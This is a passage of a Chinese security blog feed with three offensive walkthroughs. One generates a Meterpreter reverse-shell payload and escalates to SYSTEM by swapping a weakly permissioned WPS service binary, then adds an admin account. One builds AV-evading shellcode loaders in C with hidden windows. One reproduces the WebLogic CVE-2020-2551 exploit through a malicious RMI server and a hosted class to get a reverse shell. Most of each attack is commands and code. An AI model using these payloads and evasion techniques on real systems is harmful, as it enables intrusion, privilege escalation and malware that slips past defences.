        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。过程中两台机子都不通外网，本文记录一下获得会话并提权过程。 </p><h4 id="2-获取msf会话"><a href="#2-获取msf会话" class="headerlink" title="2. 获取msf会话"></a>2. 获取msf会话</h4><p>生成一个exe载荷,看情况免杀：</p><pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=443 -f exe -o 666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在准备让目标机执行我们的载荷前，先使用脚本(通过msfpc来生成)来快速监听会话，并进行一些自动进程迁移的工作：</p><pre class="line-numbers language-shell"><code class="language-shell">msfconsole -q -r '/home/yanghao/windows-meterpreter-staged-reverse-tcp-443-exe.rc'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本内容如下：</p><pre class="line-numbers language-shell"><code class="language-shell">use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.122.135set LPORT 443set ExitOnSession falseset EnableStageEncoding trueset EnableUnicodeEncoding trueset AutoRunScript 'post/windows/manage/migrate' run -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数的具体含义可以在设置了payload后执行show advanced查看:<br><img src="https://i.loli.net/2020/09/06/5v9ztK1OHNwClrm.png"><br>开始监听：<br><img src="https://i.loli.net/2020/09/06/EUw2GiQyRmSAg5L.png"><br>在目标机上执行生成的exe,获取会话：<br><img src="https://i.loli.net/2020/09/06/CpsugnLKoOMDT42.png"></p><h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3. 尝试提权"></a>3. 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="https://i.loli.net/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="https://i.loli.net/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p><p><img src="https://i.loli.net/2020/09/06/9eFRZGuTcUXVqAm.png" alt="whoami /priv"></p><h5 id="local-exploit-suggester模块失败"><a href="#local-exploit-suggester模块失败" class="headerlink" title="local_exploit_suggester模块失败"></a>local_exploit_suggester模块失败</h5><p>试试自带的模块来检查提权漏洞：</p><pre class="line-numbers language-shell"><code class="language-shell">use post/multi/recon/local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/oBGYQmOS76RuW3b.png" alt="local_exploit_suggester"><br>发现有了一些漏洞，然后就加载对应的利用模块来进行尝试：<br><img src="https://i.loli.net/2020/09/06/gXSiGskL4K1hYaC.png" alt="失败1"></p><p><img src="https://i.loli.net/2020/09/06/RqOQy21rmzaC79v.png" alt="失败2"></p><p><img src="https://i.loli.net/2020/09/06/b6kiR7uDV5Y3QcJ.png" alt="失败3"></p><h5 id="柳暗花明-enum-services利用"><a href="#柳暗花明-enum-services利用" class="headerlink" title="柳暗花明(enum_services利用)"></a>柳暗花明(enum_services利用)</h5><p>差不多模块都试了一下，因为有杀软的原因，都失败了。这时候想着找点新的exp来用用，但是网络不太方便，就先看看主机上的情况，先看了下主机上启动的服务情况：</p><pre class="line-numbers language-shell"><code class="language-shell">use post/windows/gather/enum_services<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/vCjN63hxmKEnL9l.png" alt="查看服务"><br>发现了一个在D盘的服务(wpscloudsvr LocalSystem  “D:\Program Files\WPS Office\wpscloudsvr.exe” LocalService)：<br><img src="https://i.loli.net/2020/09/06/hdliZFzBrOeIA75.png" alt="wpscloudsvr.exe"><br>这里我们知道， 在C盘Windows,Program Files等目录下的文件都会被系统权限保护，而这个wpscloudsvr服务的可执行文件放在了D盘(这也是个很正常的事，总不能啥软件都往C盘装吧)，如果软件开发过程中未对这种类似服务的文件进行权限限制同时任意用户可以对其服务进行重启动，那么就可以利用替换该服务文件的方法来获得权限提升。接下来通过<code> cacls wpscloudsvr.exe</code> 查看文件权限，发现权限设置不当，标准用户可以对其更改(图找不到了，大概结果就像下面这样)，同时发现可以直接使用net命令来启动和停止其服务：<br><img src="https://i.loli.net/2020/09/06/pMJYBTNtlm3AfPq.png" alt="NT AUTHORITY\Authenticated Users:C"></p><p>现在条件都满足了，生成个马给这个文件替换了，重新启动服务不就完成提权了吗？快速操作中…<br>1、使用msfvenom生成一个exe-service类型的载荷：</p><pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=8522 -f exe-service -o wpscloudsvr.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/MYqaP8yu9nQf7XZ.png" alt="exe-service"><br>2、上传并启动服务,并获得了会话:</p><pre class="line-numbers language-shell"><code class="language-shell">uplaod /xx/xx/wpscloudsvr.exe "D:\\Program Files\\WPS Office\\wpscloudsvr.exe"shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/kwdlUENItnpOHJ8.png"><br>这里就拿到了system权限的会话了：<br><img src="https://i.loli.net/2020/09/06/meE4iFVNKJnOBHf.png"></p><p><img src="https://i.loli.net/2020/09/06/dj4W8KmTiaMIEtl.png"><br>后面就是上远程桌面看看，加个管理员账户什么的：<br><img src="https://i.loli.net/2020/09/06/orWRgGIUk7ZubB1.png"></p><p><img src="https://i.loli.net/2020/09/06/6omMlNKGb3QZUz2.png"></p><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>1、使用metasploit脚本进行自动化设置<br>2、metasploit本地提权漏洞扫描、利用，相关信息收集模块使用；<br>3、服务可执行文件权限设置不当的cacls检查、exe-service载荷生成、替换执行提权。</p><h4 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h4><p><a href="https://blog.csdn.net/l1028386804/article/details/86669614">https://blog.csdn.net/l1028386804/article/details/86669614</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows服务提权 </tag>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的源码免杀</title>
      <link href="/2020/08/30/jian-dan-de-yuan-ma-mian-sha/"/>
      <url>/2020/08/30/jian-dan-de-yuan-ma-mian-sha/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。 </p><h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2. shellcode生成和二进制文件编译"></a>2. shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p><p>好了不说了，进入正题，首先我们使用msfvenom生成C语言shellcode:</p><pre class="line-numbers language-c"><code class="language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">12</span> <span class="token operator">-</span>b <span class="token string">'\x00'</span> LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">8.102</span> LPORT<span class="token operator">=</span><span class="token number">6666</span> <span class="token operator">-</span>f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/08/30/GCZerU1cp9gEFH2.png" alt="msfvenom"><br>然后网上找了一段C语言加载shellcode的代码。。通过内联汇编加载shellcode：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/OPT:nowin98")</span><span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")</span><span class="token comment" spellcheck="true">//不显示窗口</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//内联汇编</span>    __asm       <span class="token punctuation">{</span>        lea eax<span class="token punctuation">,</span>buf<span class="token punctuation">;</span>           call eax<span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>话不多说，先编译上线测试，启动msf监听：</p><pre class="line-numbers language-shell"><code class="language-shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://i.loli.net/2020/08/30/y7BndOlu3JG8PKt.png" alt="handler"><br> 另一边编译源码，生成exe:<br> <img src="https://i.loli.net/2020/08/30/oVZv6XKxrecbFAw.png" alt="Build_exe"><br> 双击执行exe,msf上线：<br> <img src="https://i.loli.net/2020/08/30/UyCWEo2DpJdAu84.png" alt="reverse_meterpreter"><br> 执行过程发现没有被拦截，看起来这已经免杀了：<br> <img src="https://i.loli.net/2020/08/30/RvXdq423TsuyhNE.png" alt="免杀成功"><br> 好的，免杀成功，本文结束。</p><h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3. VS免杀测试"></a>3. VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="https://i.loli.net/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p><p><img src="https://i.loli.net/2020/08/30/rjUdwQhYV7m3Tpk.png" alt="创建项目"></p><p><img src="https://i.loli.net/2020/08/30/dmXu9wGJBg748rK.png" alt="复制代码编译"><br>是吧，被发现了，我们将恶意代码全部删除后编译，发现还是被杀：<br><img src="https://i.loli.net/2020/08/30/tVhmFpTIdPL9iBJ.png"><br>emmm? 怎么办啊，这都杀!? 其实有朋友应该注意到了下面这段代码，好吧 ，我是故意没删的，因为特征就是在这：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">pragma</span> comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来将这段代码删除，重新生成exe，然后进行扫描，发现成功过了杀软:<br><img src="https://i.loli.net/2020/08/30/lDvSHZB6jrOtFcU.png"></p><p>vs编译的这个内联加载不能正常上线，修改下加载方法：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> exec <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>exec<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>exec<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么编译执行后会有个DOS窗口：<br><img src="https://i.loli.net/2020/08/30/LVk8Qa3oDpbilH9.png"></p><p>这里我们<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">ShowWindow</a>函数来隐藏窗体：<br><img src="https://i.loli.net/2020/08/30/lf5rY1kmBswMRaq.png" alt="ShowWindow"><br>需要两个参数，一个是程序窗口句柄，可以通过<a href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> 来获得当前窗口句柄，另一个是int类型的nCmdShow，来控制窗口的状态，这里使用SW_HIDE来隐藏窗口：<br><img src="https://i.loli.net/2020/08/30/H5RLctbSJnQBorW.png" alt="nCmdShow"></p><pre class="line-numbers language-c"><code class="language-c"><span class="token function">ShowWindow</span><span class="token punctuation">(</span><span class="token function">GetConsoleWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SW_HIDE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再编译执行和免杀测试，可以看到免杀且无窗口：<br><img src="https://i.loli.net/2020/08/30/sQ1j6vhLouC5dOb.png"></p><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://www.zhihu.com/question/282945808">https://www.zhihu.com/question/282945808</a><br><a href="https://blog.csdn.net/zac_sian/article/details/46778285">https://blog.csdn.net/zac_sian/article/details/46778285</a><br><a href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">https://docs.microsoft.com/en-us/windows/console/getconsolewindow</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msfvenom免杀 </tag>
            
            <tag> C语言免杀 </tag>
            
            <tag> 隐藏程序窗口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-2551复现</title>
      <link href="/2020/08/22/cve-2020-2551-fu-xian/"/>
      <url>/2020/08/22/cve-2020-2551-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><blockquote><p>2020年1月15日, Oracle官方发布了Weblogic IIOP反序列化漏洞CVE-2020-2551的漏洞通告，漏洞等级为高危，CVVS评分为9.8分，漏洞利用难度低。影响范围为10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0。</p></blockquote><h4 id="2-获取exp并配置编译"><a href="#2-获取exp并配置编译" class="headerlink" title="2. 获取exp并配置编译"></a>2. <a href="https://github.com/zzwlpx/weblogicPoc">获取exp</a>并配置编译</h4><p> <i class="far fa-hand-point-right"> 给项目配置JDK</i><br>  <img src="https://i.loli.net/2020/08/22/eqLaXfthxCWPFkb.png" alt="目录结构"></p><p>  <img src="https://i.loli.net/2020/08/22/MTPlbWHDxef7IaJ.png" alt="选择jdk"></p><p> <i class="far fa-hand-point-right"> 配置Modules</i><br> 选择src 后点 Sources,  选择out 后点 Excluded<br> <img src="https://i.loli.net/2020/08/22/94IgR1yeohwfvVc.png"><br> 选完之后，看到一排红：<br><img src="https://i.loli.net/2020/08/22/QzGhpBJ8mcwI4SE.png"><br> 这是因为有些包没导入，代码找不到，这里把lib文件夹下的包导入进项目：<br> <img src="https://i.loli.net/2020/08/22/HJzGVU4k5uQACiI.png"><br> 然后就没得报错了：<br><img src="https://i.loli.net/2020/08/22/sAg9FH5QVyDKwou.png"></p><p>  <i class="far fa-hand-point-right"> 打包配置</i><br>配置build:<br><img src="https://i.loli.net/2020/08/22/bSU72uhVIwdpGCn.png"><br>选择main函数：<br><img src="https://i.loli.net/2020/08/22/BR8ElPGQiuxXgew.png"><br>build打包成可执行文件：<br><img src="https://i.loli.net/2020/08/22/hKMricwEuIpgAJn.png"><br>发现又报错了，说没设置输出路径，配置一下:<br><img src="https://i.loli.net/2020/08/22/7mbKwzFtJElnU6g.png"></p><p><img src="https://i.loli.net/2020/08/22/l1fcKw7dn4mZpJe.png"><br>继续build，又报错：<br><img src="https://i.loli.net/2020/08/22/PxagBIbLeO8G9k6.png"><br>是上面的配置jdk下面那个project language level选高了 ，改成8，再来一次build，哇 成功输出文件：<br><img src="https://i.loli.net/2020/08/22/iX89Nomy2hObsAf.png"><br>马上就要运行一下，没问题了：<br><img src="https://i.loli.net/2020/08/22/BbRS5vzxPM2E8Gn.png"></p><p><img src="https://i.loli.net/2020/08/22/4i25J7BTXm1aNUQ.png"></p><h4 id="3-进行复现"><a href="#3-进行复现" class="headerlink" title="3. 进行复现"></a>3. 进行复现</h4><p><i class="far fa-hand-point-right">首测失败</i><br>用<a href="https://github.com/vulhub/vulhub">vulhub</a>搭建了一个weblogic环境，恶意rmi使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">JNDI-Injection-Exploit</a>。但是这个工具编译版本为jdk1.7+,漏洞环境是jdk1.6，所以没成功，从下面日志中可以看到漏洞触发成功访问了rmi服务，但是接着报错不支持version 52，说明执行代码的jdk版本低于编译的jdk版本。搜到jdk版本和stanford parser对应关系是J2SE 8 = 52,J2SE 7 = 51,J2SE 6.0 = 50,J2SE 5.0 = 49,JDK 1.4 = 48,JDK 1.3 = 47,JDK 1.2 = 46,JDK 1.1 = 45，所以后面用指定编译版本为1.6编译exp。</p><p><img src="https://i.loli.net/2020/08/22/LnJFTZjINAUGHcO.png"></p><p><img src="https://i.loli.net/2020/08/22/pCW3QS8huHdq74i.png"><br><i class="far fa-hand-point-right">这下该成功了吧</i><br>1、使用<code>javac Poc.java -source 1.6 -target 1.6</code> 指定版本来编译Poc.java:<br><img src="https://i.loli.net/2020/08/22/v7rx1BlsGL63Hbq.png"><br>并且启动一个web服务来让恶意类可以被访问到<code>python3 -m http.server 80</code></p><p>2、恶意rmi服务<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.111.1/#Poc" 1099</code><br> <img src="https://i.loli.net/2020/08/22/tvqyw4ViMRDs6X2.png"><br> 3、用poc测试<code>java -jar CVE-2020-2551.jar 192.168.111.130 7001 rmi://192.168.111.1:1099/Poc</code><br> <img src="https://i.loli.net/2020/08/22/QWrdZmLjRFpC4k9.png"><br> 4、可以看到weblogic请求rmi后从web服务器里获取到了恶意类：<br><img src="https://i.loli.net/2020/08/22/3cKysEfCUx7w5uA.png"><br>5、此时上漏洞环境查看目录，命令执行成功：<br><img src="https://i.loli.net/2020/08/22/mOjkndpgSUhMAZX.png"><br>6、反弹shell：<br><img src="https://i.loli.net/2020/08/22/9te16OBNi8huVcP.png" alt="执行流程"></p><p><img src="https://i.loli.net/2020/08/22/k9sf8bBZaKXMTrI.png" alt="成功后的日志"></p><hr><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://blog.csdn.net/m0_37961948/article/details/78161828?utm_source=blogxgwz3">https://blog.csdn.net/m0_37961948/article/details/78161828?utm_source=blogxgwz3</a><br><a href="https://www.cnblogs.com/zhaoqingqing/p/11847791.html">https://www.cnblogs.com/zhaoqingqing/p/11847791.html</a><br><a href="https://blog.csdn.net/weixin_43149083/article/details/89639747">https://blog.csdn.net/weixin_43149083/article/details/89639747</a><br><a href="https://y4er.com/post/weblogic-cve-2020-2551/">https://y4er.com/post/weblogic-cve-2020-2551/</a><br><a href="https://xz.aliyun.com/t/7374#toc-13">https://xz.aliyun.com/t/7374#toc-13</a><br><a href="https://xz.aliyun.com/t/7498">https://xz.aliyun.com/t/7498</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic漏洞 </tag>
            
            <tag> IDEA编译 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
